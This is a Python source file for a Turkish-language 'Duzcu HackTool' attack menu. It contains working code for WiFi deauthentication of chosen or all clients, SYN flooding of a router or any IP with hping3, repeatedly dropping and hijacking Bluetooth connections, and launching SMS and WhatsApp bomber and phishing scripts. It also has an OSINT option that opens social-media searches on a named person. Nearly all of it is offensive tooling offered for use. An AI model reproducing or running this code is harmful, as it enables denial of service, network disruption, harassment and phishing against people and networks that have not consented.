from colorama import init, Fore, Style

import subprocess
import time
import os
import socket
import sys
import subprocess
import importlib.util

init(autoreset=True)

def check_dependencies():
    requirements_file = "requirements.txt" 
    if not os.path.exists(requirements_file):
        print(Fore.RED + f"Hata: '{requirements_file}' dosyası bulunamadı." + Style.RESET_ALL)
        print(Fore.RED + "Lütfen 'requirements.txt' dosyasının script ile aynı dizinde olduğundan emin olun." + Style.RESET_ALL)
        sys.exit(1)

    with open(requirements_file, 'r') as f:
        required_packages = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]

    missing_packages = []
    for package in required_packages:
        import_name = package.split('==')[0].split('>=')[0].split('<=')[0].split('~=')[0]
        if import_name == "beautifulsoup4":
            import_name = "bs4"
        elif import_name == "python-requests":
            import_name = "requests"
        
        spec = importlib.util.find_spec(import_name)
        if spec is None:
            missing_packages.append(package)

    if missing_packages:
        print(Fore.RED + "[HATA] Eksik kütüphaneler tespit edildi!" + Style.RESET_ALL)
        print(Fore.YELLOW + "Lütfen aşağıdaki kütüphaneleri yükleyin:" + Style.RESET_ALL)
        for pkg in missing_packages:
            print(Fore.YELLOW + f"  - {pkg}" + Style.RESET_ALL)
        print(Fore.GREEN + "Tüm eksik kütüphaneleri yüklemek için aşağıdaki komutu çalıştırın:" + Style.RESET_ALL)
        print(Fore.LIGHTMAGENTA_EX + f"pip3 install -r {requirements_file}" + Style.RESET_ALL)
        sys.exit(1)
    else:
        print(Fore.CYAN + "Gerekli kütüphaneler kontrol ediliyor..." + Style.RESET_ALL)
        print(Fore.GREEN + "Tüm gerekli kütüphaneler yüklü." + Style.RESET_ALL)

check_dependencies()

def clear():
    subprocess.run("clear", shell=True)

def run_cmd(cmd):
    try:
        subprocess.run(cmd, shell=True, check=True,
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL,
                       stdin=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        pass


def monitor_mode_ac():
    clear()
    print(Fore.YELLOW + "[*] Monitor moda geçiliyor...")
    run_cmd("airmon-ng check kill")
    run_cmd("nmcli networking off")
    run_cmd("rfkill unblock all")
    run_cmd("systemctl stop NetworkManager.service")
    run_cmd("systemctl stop wpa_supplicant.service")
    time.sleep(2)
    run_cmd("airmon-ng start wlan0")
    print(Fore.GREEN + "[+] Monitor moda geçildi (wlan0).")
    time.sleep(2)

def aglari_tar(sure=30):
    clear()
    print(Fore.YELLOW + f"[*] Ağlar {sure} saniye boyunca taranıyor...")
    dumpfile = "/tmp/aglar-01.csv"
    if os.path.exists(dumpfile):
        os.remove(dumpfile)
    proc = subprocess.Popen(
        "airodump-ng --output-format csv -w /tmp/aglar wlan0",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )
    time.sleep(sure)
    proc.terminate()
    proc.wait()
    print(Fore.GREEN + "[+] Tarama tamamlandı.")
    time.sleep(1)
    try:
        with open(dumpfile, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except FileNotFoundError:
        return ''

def aglari_ayikla(csv_veri):
    aglar = []
    satirlar = csv_veri.splitlines()
    parsing = False
    for satir in satirlar:
        if 'BSSID' in satir and 'ESSID' in satir:
            parsing = True
            continue
        if parsing:
            if satir.startswith('Station MAC') or satir.strip() == '':
                break
            parcala = satir.split(',')
            if len(parcala) >= 14:
                bssid = parcala[0].strip()
                kanal = parcala[3].strip()
                essid = parcala[13].strip()
                aglar.append({'bssid': bssid, 'channel': kanal, 'essid': essid})
    return aglar

def cihazlari_tar(bssid, kanal, sure=30):
    clear()
    print(Fore.YELLOW + f"[*] Cihazlar {sure} saniye boyunca taranıyor...")
    dumpfile = "/tmp/cihazlar-01.csv"
    if os.path.exists(dumpfile):
        os.remove(dumpfile)
    cmd = f"airodump-ng --bssid {bssid} -c {kanal} --output-format csv -w /tmp/cihazlar wlan0"
    proc = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )
    time.sleep(sure)
    proc.terminate()
    proc.wait()

    cihazlar = []
    try:
        with open(dumpfile, "r", encoding="utf-8", errors="ignore") as f:
            satirlar = f.readlines()
        start = False
        for s in satirlar:
            if 'Station MAC' in s:
                start = True
                continue
            if start and s.strip():
                parcala = s.strip().split(',')
                if len(parcala) >= 1:
                    cihazlar.append(parcala[0].strip())
    except FileNotFoundError:
        pass
    return cihazlar

import threading

def deauth_hedef_saldir(bssid, hedef, paket_sayisi):
    print(Fore.WHITE + f" -> {hedef} adresine saldırı başlatıldı...")
    if paket_sayisi == 0:
        cmd = f"aireplay-ng --deauth 0 -a {bssid} -c {hedef} wlan0"
    else:
        cmd = f"aireplay-ng --deauth {paket_sayisi} -a {bssid} -c {hedef} wlan0"
    # subprocess.run yerine Popen kullanıyoruz ki çıktıyı alalım ve işlem paralel olsun
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in proc.stdout:
        print(Fore.WHITE + f"[{hedef}] {line.strip()}")
    proc.wait()
    print(Fore.WHITE + f" -> {hedef} adresine saldırı tamamlandı.")

def deauth_saldir(bssid, hedefler, paket_sayisi):
    clear()
    print(Fore.YELLOW + f"[*] Saldırı başlatılıyor: {len(hedefler)} hedef, Paket sayısı: {paket_sayisi if paket_sayisi != 0 else 'Sınırsız'}")
    thread_list = []
    for hedef in hedefler:
        t = threading.Thread(target=deauth_hedef_saldir, args=(bssid, hedef, paket_sayisi))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print(Fore.GREEN + "[+] Tüm saldırılar tamamlandı.")
    time.sleep(3)

def input_int(prompt, min_val=None, max_val=None):
    while True:
        val = input(prompt)
        if not val.isdigit():
            print(Fore.WHITE + "Lütfen sayı gir.")
            continue
        val = int(val)
        if (min_val is not None and val < min_val) or (max_val is not None and val > max_val):
            print(Fore.WHITE + f"Lütfen {min_val} ile {max_val} arasında sayı gir.")
            continue
        return val

def get_gateway_ip():
    # varsayılan gateway ip'yi alır (linux)
    try:
        route = subprocess.check_output("ip route show default", shell=True).decode()
        gateway = route.split()[2]
        return gateway
    except Exception:
        return None

def port_tarama(ip, portlar=[80, 443, 8080, 22, 23, 21, 53, 3389]):
    print(Fore.YELLOW + f"[*] {ip} adresinde portlar taranıyor...")
    acik_portlar = []
    for port in portlar:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        try:
            result = sock.connect_ex((ip, port))
            if result == 0:
                acik_portlar.append(port)
        except Exception:
            pass
        finally:
            sock.close()
    return acik_portlar

def flood_saldir(ip, port, paket_sayisi):
    print(Fore.YELLOW + f"[*] {ip}:{port} adresine flood saldırısı başlatılıyor. Paket sayısı: {paket_sayisi}")
    # flood için hping3 kullanacağız
    if paket_sayisi == 0:
        paket_sayisi = ""  # sınırsız
    else:
        paket_sayisi = f"-c {paket_sayisi}"
    cmd = f"hping3 {paket_sayisi} -S -p {port} --flood {ip}"
    subprocess.run(cmd, shell=True)

def ip_modem_saldiri_menu():
    clear()
    print(Fore.CYAN + "=== Flood Saldırı Seçimi ===")
    print(Fore.WHITE + "1) WiFi Flood Saldırısı (Modeme)")
    print(Fore.WHITE + "2) IP Adresine Flood Saldırısı")
    print(Fore.WHITE + "3) Geri Dön")
    secim = input_int("Seçimin: ", 1, 3)

    if secim == 1:
        aglar = aglari_ayikla(aglari_tar())
        if not aglar:
            print(Fore.RED + "[!] Ağ bulunamadı. Menüye dönülüyor...")
            time.sleep(2)
            return

        print(Fore.CYAN + "\n--- Taranan Ağlar ---")
        for i, ag in enumerate(aglar, 1):
            print(Fore.WHITE + f"{i}. ESSID: {ag['essid']} | BSSID: {ag['bssid']} | Kanal: {ag['channel']}")

        secim_ag = input_int("\nHedef ağ numarasını seç: ", 1, len(aglar))
        secilen_ag = aglar[secim_ag - 1]

        gateway_ip = get_gateway_ip()
        if not gateway_ip:
            print(Fore.RED + "[!] Gateway IP alınamadı. Menüye dönülüyor...")
            time.sleep(2)
            return

        print(Fore.WHITE + f"Seçilen ağın gateway IP'si: {gateway_ip}")

        acik_portlar = port_tarama(gateway_ip)
        if not acik_portlar:
            print(Fore.RED + "[!] Açık port bulunamadı. Menüye dönülüyor...")
            time.sleep(2)
            return

        print(Fore.WHITE + f"Açık portlar bulundu: {acik_portlar}")
        cevap = input("Saldırı yapılsın mı? (e/h): ").lower()
        if cevap != 'e':
            print(Fore.CYAN + "Saldırı iptal edildi. Menüye dönülüyor...")
            time.sleep(2)
            return

        port_secim = input_int("Hangi portu hedefleyelim? Seçiniz: ", min_val=min(acik_portlar), max_val=max(acik_portlar))
        paket_sayisi = input_int("Kaç paket gönderilsin? (0 sınırsız): ", 0)

        flood_saldir(gateway_ip, port_secim, paket_sayisi)

    elif secim == 2:
        ip = input("Hedef IP adresini gir: ")
        acik_portlar = port_tarama(ip)
        if not acik_portlar:
            print(Fore.RED + "[!] Açık port bulunamadı. Menüye dönülüyor...")
            time.sleep(2)
            return

        print(Fore.WHITE + f"Açık portlar bulundu: {acik_portlar}")
        cevap = input("Saldırı yapılsın mı? (e/h): ").lower()
        if cevap != 'e':
            print(Fore.CYAN + "Saldırı iptal edildi. Menüye dönülüyor...")
            time.sleep(2)
            return

        port_secim = input_int("Hangi portu hedefleyelim? Seçiniz: ", min_val=min(acik_portlar), max_val=max(acik_portlar))
        paket_sayisi = input_int("Kaç paket gönderilsin? (0 sınırsız): ", 0)

        flood_saldir(ip, port_secim, paket_sayisi)

    else:
        print(Fore.WHITE + "Geri dönülüyor...")
        time.sleep(1)
        return
        
def osint_menu():
    import webbrowser
    import shutil
    
    clear()
    print(Fore.RED + "[!] ⚠️ Eğer Siteler Açılmazsa Rootsuz Çalıştırıp Kullanmanız Lazım |Python3 hack_menusu.py| ") 
    time.sleep(5)
    clear()
    
    firefox_path = shutil.which("firefox")
    if firefox_path:
        webbrowser.register('firefox', None, webbrowser.BackgroundBrowser(firefox_path))
        browser = webbrowser.get('firefox')
    else:
        print(Fore.RED + "🚫 Firefox bulunamadı. Lütfen sistemine kurulu olduğundan emin ol.") 
        time.sleep(3)
        return
        
    print(Fore.WHITE + "=== Google OSINT Arama Menüsü === 🔍") 
    sorgu = input(Fore.CYAN + "🔎 Aranacak isim veya cümleyi gir: " + Fore.RESET) 
    saniye = input_int(Fore.CYAN + "⏳ Kaç saniye arama yapılsın?: " + Fore.RESET, 5)

    print(Fore.YELLOW + f"\n[*] {saniye} saniye boyunca Google'da '{sorgu}' aranıyor...\n") 
    print(Fore.YELLOW + "🌐 Sayfalar açılıyor, lütfen bekleyin... ⏳") 

    start_time = time.time()
    sayfalar = [
        "https://www.google.com/search?q=" + sorgu,
        "https://www.facebook.com/search/top?q=" + sorgu,
        "https://www.instagram.com/" + sorgu.replace(" ", ""),
        "https://twitter.com/search?q=" + sorgu,
        "https://www.youtube.com/results?search_query=" + sorgu,
    ]

    bulunanlar = []

    for url in sayfalar:
        if time.time() - start_time >= saniye:
            break
        bulunanlar.append(url)
        time.sleep(1)

    print(Fore.GREEN + "\n[*] ✅ Arama tamamlandı! Bulunan sayfalar:\n") 
    for i, link in enumerate(bulunanlar, 1):
        print(Fore.WHITE + f"🔗 {i}- {link}")

    print(Fore.MAGENTA + "0- Tümünü aynı tarayıcıda sekme olarak aç") 

    secim = input_int(Fore.BLUE + "\n❓ Hangi link açılsın? (0 hepsi): " + Fore.RESET, 0, len(bulunanlar))

    if secim == 0:
        print(Fore.GREEN + "✨ Tüm sayfalar sekme olarak açılıyor...") 
        browser.open_new(bulunanlar[0])
        for link in bulunanlar[1:]:
            browser.open_new_tab(link)
    else:
        print(Fore.GREEN + f"✨ Seçilen link ({secim}) açılıyor...") 
        browser.open_new(bulunanlar[secim - 1])

    print(Fore.YELLOW + "Devam etmek için bir tuşa basın... ↩️") 
    time.sleep(2)

def wifi():
    clear()
    time.sleep(1)
    print(Fore.YELLOW + "[*] Monitor moddan çıkılıyor...")
    time.sleep(5)
    run_cmd("airmon-ng stop wlan0")
    print(Fore.YELLOW + "[*] Airmon-ng Başarılıyla Durduruldu")
    time.sleep(3)
    run_cmd("systemctl start NetworkManager.service")
    print(Fore.YELLOW + "[*] NetworkManager Başarılıyla Başlatıldı")
    time.sleep(3)
    run_cmd("systemctl start wpa_supplicant.service")
    print(Fore.YELLOW + "[*] Wpa Sistemi Başarılıyla Başlatıldı")
    time.sleep(3)
    run_cmd("nmcli networking on")
    print(Fore.YELLOW + "[*] İnternete Erişim Motoru Başarılı Şekilde Başlatıldı")
    time.sleep(3)
    run_cmd("ip link set wlan0 down")
    print(Fore.YELLOW + "[*] İp Adresi Başarılıyla Verildi")
    time.sleep(3)
    run_cmd("iwconfig wlan0 mode managed")
    print(Fore.YELLOW + "[*] Wlan0 Başarılıyla Yerleşti")
    time.sleep(3)
    run_cmd("ip link set wlan0 up")
    print(Fore.YELLOW + "[*] İp İnternete Çıkartıldı...")
    time.sleep(5)
    print(Fore.YELLOW + "[*] Wlan0 Mode:Managed Olarak Ayarlandı...")
    time.sleep(5)
    run_cmd("airmon-ng stop wlan0")
    run_cmd("nmcli networking on")
    run_cmd("rfkill unblock all")
    run_cmd("systemctl start NetworkManager.service")
    run_cmd("systemctl start wpa_supplicant.service")
    time.sleep(5)
    run_cmd("sudo nmcli networking on")
    clear()
    print(Fore.WHITE + "[✓] WiFi Artık Kullanılabilir!")
    time.sleep(3)
    return
    
def bluetooth_saldir():
    import subprocess
    import time
    import os
    
    subprocess.run("clear", shell=True)
    subprocess.run("bluetoothctl power on", shell=True)
    print(Fore.YELLOW + "[*] Bluetooth cihazlar 30 saniye boyunca taranıyor...")
    subprocess.run("bluetoothctl scan on &", shell=True)
    time.sleep(30)
    subprocess.run("bluetoothctl scan off", shell=True)

    print(Fore.WHITE + "\n--- Eşleşmiş Cihazlar Listeleniyor ---")
    cihazlar = subprocess.check_output("bluetoothctl devices", shell=True).decode().splitlines()
    if not cihazlar:
        print(Fore.RED + "[!] Cihaz bulunamadı!")
        return

    for i, cihaz in enumerate(cihazlar, 1):
        print(Fore.WHITE + f"{i}. {cihaz}")

    secim = int(input("\nHedef cihaz numarasını gir: "))
    hedef_satir = cihazlar[secim - 1]
    hedef_mac = hedef_satir.split()[1]

    print(Fore.YELLOW + f"\n[*] Hedef cihaz: {hedef_mac}")
    print(Fore.YELLOW + "[*] Cihaz bağlantısı izleniyor ve düşürülmeye çalışılıyor...")

    while True:
        bagli_mi = subprocess.getoutput(f"bluetoothctl info {hedef_mac}")
        if "Connected: yes" in bagli_mi:
            print(Fore.RED + "[!] Cihaz bağlı durumda, bağlantı kesilmeye çalışılıyor...")
            subprocess.run(f"bluetoothctl disconnect {hedef_mac}", shell=True)
        else:
            print(Fore.GREEN + "[+] Cihaz boşta, bağlantı deneniyor...")
            subprocess.run(f"bluetoothctl connect {hedef_mac}", shell=True)
            time.sleep(2)
            yeni_durum = subprocess.getoutput(f"bluetoothctl info {hedef_mac}")
            if "Connected: yes" in yeni_durum:
                print(Fore.WHITE + "✅ Cihaza başarıyla bağlanıldı!")
                break
        time.sleep(3)
        
def phisher():

    """
    phisher.py scriptini çalıştırır
    """
    script_to_run = "phisher.py"
    subprocess.call([sys.executable, script_to_run])     
        
def wbomb():

    """
    wbomb.py scriptini çalıştırır
    """
    script_to_run = "wbomb.py"
    subprocess.call([sys.executable, script_to_run])
        
def bsms():

    """
    sbomb.py scriptini çalıştırır.
    """
    script_to_run = "sbomb.py" 
    subprocess.call([sys.executable, script_to_run])

def bmbmenu():
    clear()
    print(f"{Fore.CYAN}╔═════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║{Fore.YELLOW}          💣 BOMBA SALDIRISI MENÜSÜ 💣       {Fore.CYAN}║")
    print(f"{Fore.CYAN}╠═════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}║ {Fore.LIGHTBLUE_EX}1) ✉️ SMS Bomber                             {Fore.CYAN}║")
    print(f"{Fore.CYAN}║ {Fore.LIGHTGREEN_EX}2) 💬 WhatsApp Bomber                       {Fore.CYAN}║")
    print(f"{Fore.CYAN}║ {Fore.LIGHTRED_EX}3) ↩️ Geri Dön                               {Fore.CYAN}║")
    print(f"{Fore.CYAN}╚═════════════════════════════════════════════╝")

    secim = input_int(Fore.MAGENTA + "Seçimin: ", 1, 3)
    if secim == 1:
        bsms()
    elif secim == 2:
        wbomb()
    elif secim == 3:
        ana_menu()

def ana_menu():
    while True:
        clear()
        print(Fore.CYAN + """╔══════════════════════════════════╗      Sistem Uyumluluğu:
║       """ + Fore.YELLOW + "Duzcu HackTool" + Fore.CYAN + """             ║      ---""")
        print(Fore.CYAN + "║       Discord:" + Fore.LIGHTMAGENTA_EX + " .El.Pipi." + Fore.CYAN + "         ║     " + Fore.YELLOW + "**Kali Linux:**")
        print(Fore.CYAN + "║       İnstagram:" + Fore.LIGHTMAGENTA_EX + " Duzcu480" + Fore.CYAN + "        ║     " + Fore.GREEN + " * Cihaza Deauth Saldırısı: Tamamen çalışır.")
        print(Fore.CYAN + "║                                  ║     " + Fore.GREEN + " * Modeme/IP Flood Saldırısı: Tamamen çalışır.")
        print(Fore.CYAN + "╠══════════════════════════════════╣     " + Fore.GREEN + " * OSINT Google Arama: Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "1) 📡 Cihaza Deauth Saldırısı" + Fore.CYAN + "    ║     " + Fore.GREEN + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "2) 🌐 Modem / IP Flood ." + Fore.CYAN + "         ║      ---")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "3) 🔍 OSINT Google Arama" + Fore.CYAN + "         ║     " + Fore.LIGHTRED_EX + "**Parrot" + Fore.BLUE + " OS:**")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "4) 📶 WiFi Bağlanma(Mode Managed)" + Fore.CYAN + "║     " + Fore.LIGHTGREEN_EX + " * Cihaza Deauth Saldırısı: Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "5) 🕵️ Bluetooth Sızma" + Fore.CYAN + "             ║     " + Fore.LIGHTGREEN_EX + " * Modeme/IP Flood Saldırısı: Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.YELLOW + "6) 💣 Bombalar                   " + Fore.CYAN + "║     " + Fore.LIGHTGREEN_EX + " * OSINT Google Arama: Tamamen çalışır.") # Yeni satır
        print(Fore.CYAN + "║ " + Fore.YELLOW + "7) 📚 Phishing Saldırısı         " + Fore.CYAN + "║     " + Fore.LIGHTGREEN_EX + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
        print(Fore.CYAN + "║ " + Fore.LIGHTRED_EX + "8) 📚 Çıkış                      " + Fore.CYAN + "║")
        print(Fore.CYAN + "╚══════════════════════════════════╝      ---")
        print("                                         " + Fore.LIGHTYELLOW_EX + "**Ubuntu" + Fore.CYAN + " (Mint, Debian dahil):**")
        print("                                         " + Fore.MAGENTA + " * Cihaza Deauth Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.MAGENTA + " * Modeme/IP Flood Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.MAGENTA + " * OSINT Google Arama: Tamamen çalışır.")
        print("                                         " + Fore.MAGENTA + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
        print("                                         " + Fore.MAGENTA + " * Bluetooth Sızma : Tamamen çalışır.")
        print("                                          ---")
        print("                                         " + Fore.BLUE + "**Fedora" + Fore.LIGHTRED_EX + " (CentOS, RHEL dahil):**")
        print("                                         " + Fore.YELLOW + " * Cihaza Deauth Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.YELLOW + " * Modeme/IP Flood Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.YELLOW + " * OSINT Google Arama: Tamamen çalışır.")
        print("                                         " + Fore.YELLOW + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
        print("                                         " + Fore.YELLOW + " * Bluetooth Sızma : Tamamen çalışır.")
        print("                                          ---")
        print("                                         " + Fore.LIGHTMAGENTA_EX + "**Arch" + Fore.CYAN + " Linux (Manjaro dahil):**")
        print("                                         " + Fore.WHITE + " * Cihaza Deauth Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.WHITE + " * Modeme/IP Flood Saldırısı: Kurulum sonrası çalışır.")
        print("                                         " + Fore.WHITE + " * OSINT Google Arama: Tamamen çalışır.")
        print("                                         " + Fore.WHITE + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
        print("                                         " + Fore.WHITE + " * Bluetooth Sızma : Kurulum sonrası çalışır.")
        print("                                          ---")
        print("                                         " + Fore.CYAN + "**Alpine Linux:**")
        print("                                         " + Fore.LIGHTRED_EX + " * Cihaza Deauth Saldırısı: Kurulumu zorlu, genellikle çalışmaz.")
        print("                                         " + Fore.LIGHTRED_EX + " * Modeme/IP Flood Saldırısı: Kurulumu zorlu, genellikle çalışmaz.")
        print("                                         " + Fore.LIGHTRED_EX + " * OSINT Google Arama: Çalışır.")
        print("                                         " + Fore.LIGHTRED_EX + " * WiFi Bağlanma (Mode Managed): Çalışmaz, komutlar farklı.")
        print("                                         " + Fore.LIGHTRED_EX + " * Bluetooth Sızma : Kurulumu zorlu, genellikle çalışmaz.")
        print("                                         ")
        print("                                         " + Fore.RED + "**Önemli Not:** " + Fore.YELLOW + "Deauth ve Flood saldırıları için Root yetkisi lazımdır, lütfen " + Fore.GREEN + " 'sudo hack_menusu.py' " + Fore.YELLOW + " olarak başlatın**")

        secim = input_int(Fore.MAGENTA + "Seçimin: ", 1, 8)
        if secim == 1:
            deauth_menu()
        elif secim == 2:
            ip_modem_saldiri_menu()
        elif secim == 3:
            osint_menu()
        elif secim == 4:
            wifi()
        elif secim == 5:
            bluetooth_saldir()
        elif secim == 6:
            bmbmenu()
        elif secim == 7:
            phisher()
        elif secim == 8:
            print(Fore.WHITE + "Çıkış yapılıyor...")
            break

def deauth_menu():
    monitor_mode_ac()
    aglar = aglari_ayikla(aglari_tar())
    if not aglar:
        print(Fore.RED + "[!] Ağ bulunamadı. Menüye dönülüyor...")
        time.sleep(2)
        return

    print(Fore.CYAN + "\n--- Taranan Ağlar ---")
    for i, ag in enumerate(aglar, 1):
        print(Fore.WHITE + f"{i}. ESSID: {ag['essid']} | BSSID: {ag['bssid']} | Kanal: {ag['channel']}")

    secim = input_int("\nSaldırılacak ağ numarası: ", 1, len(aglar))
    secilen_ag = aglar[secim - 1]

    cihazlar = cihazlari_tar(secilen_ag['bssid'], secilen_ag['channel'])
    if not cihazlar:
        print(Fore.RED + "[!] Cihaz bulunamadı. Menüye dönülüyor...")
        time.sleep(2)
        return

    print(Fore.CYAN + "\n--- Taranan Cihazlar ---")
    for i, cihaz in enumerate(cihazlar, 1):
        print(Fore.WHITE + f"{i}. {cihaz}")
    print(Fore.WHITE + "0. Hepsine saldır")

    cihaz_sec = input_int("Hedef cihaz numarası (0 hepsi): ", 0, len(cihazlar))
    hedefler = cihazlar if cihaz_sec == 0 else [cihazlar[cihaz_sec - 1]]

    paket = input_int("Kaç paket gönderilsin?: ", 1)

    deauth_saldir(secilen_ag['bssid'], hedefler, paket)

if __name__ == "__main__":
    ana_menu() 
